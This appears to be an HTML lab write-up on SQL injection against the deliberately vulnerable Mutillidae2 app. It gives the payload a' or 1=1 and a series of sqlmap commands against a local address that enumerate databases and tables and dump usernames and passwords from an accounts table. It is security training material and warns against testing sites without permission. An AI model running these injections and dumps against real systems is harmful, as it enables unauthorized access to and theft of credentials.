# A1
<h2>User Info</h2>

<p>We are dealing with a case of SQL Injection here. So we need to escape the intended context and fetch all users.
This one breaks down with the simplest and most trivial, <i><b>a' or 1=1</b></i>. Mutillidae2 fetches error messages from the database, and hence you know what query is being run. In the real world, most of the SQL injection attacks that work are blind or inference based.
This causes the <i>"WHERE"</i> clause to return true and all the user details are displayed without any hassle. We have successfully used SQLINJECTION to get our hands on sensitive data.
</p>

<h3>Note</h3>
<p>Please do not go about trying inserting SQL injection based input on webistes not owned by you, or sites on which you do not have permissions to perform tests on. Modern architectures have IDS setup which will monitor suspicious activity ,and report your IP.
</p>
Also, Mutillidae2 presents to you the SQL injection on a plate, including displaying error messages. In the real world, lot of mapping, pruning and scanning is required before any vulnerability is identified.

<h3>Execution</h3>
<ol>
	<li>Manually submit values via browser interface, i.e username=<b>a'or 1 = 1</b>. However, level 2 will fail as the Javascript will prevent this. Hence the script will bypass this client side defense.
	<ul>
		<li>Will be prevented by Client side scripting(Stupid Level 2)</li>
		<li>Not hackery enough, doesn't give you the feel good</li>
	</ul>
	</li>
<li>	
Use a good'ol script that behaves like a browser. Attached the most simple script possible in pytnon
using Mechanize. (sqlinjection.py). It can be modified to be bit smart and adaptive. For now it snipes on the User Info page.
</li>
<li>
Use the grand daddy SQLMap tool. More on how to use sqlmap can be found by reading the man page.SQLMap ships by default with Kali Linux.
<ul>
			<li>
				<p>Start by locating sqlmap if it is already installed<p>
				<pre>
locate sqlmap.py
				</pre>
				Traverse to the directory, which will be "/usr/share/sqlmap" , if it is installed
			</li>
			<li>
				First step is to find out, the action URL i.e where the data is being submitted. There are many ways to do this, but I prefer doing it via the proxy of WebExploit tool BurpSuite, by PortSwigger.
				The request URL and method type must be indentified. In this case, the GET request reflects in the URL and can be copied from there. <br> In Burp Suite this can be done using the inbuilt proxy and copying th details from there. <br> We now use the URL with SQLMap as follows.<br> The values of the username and password do not matter,those keys will be used by SQLMap for injection.
				The 
				<pre>
./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=dotcom&user-info-php-submit-button=View+Account+Details" --dbs  
				</pre>
				</li>
				<li>
					The above command will display the databases that could be accessed, use "<b>-D &ltDatabaseName&gt</b>" , and <b>--tables</b>to see tables for the database.
					<pre>
./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=dotcom&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp --tables
					</pre>
					</li>
					<li>
Once ,tables are displayed,a table name can be selected using "<b>-T &lttableName&gt</b>" and display columns using "<b>--columns</b>"
<pre>
./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=password&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp -T accounts --columns
</pre>
</li>
<li>
	One or more columns may then be selected using "<b>-C &ltcolumn1Name,column2Name&gt</b>" and the data can be dumped by specifying the option "<b>--dump</b>"
	<pre>
./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=password&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp -T accounts -C username,password --dump
</pre>
	</li>
</ul>
</ol>
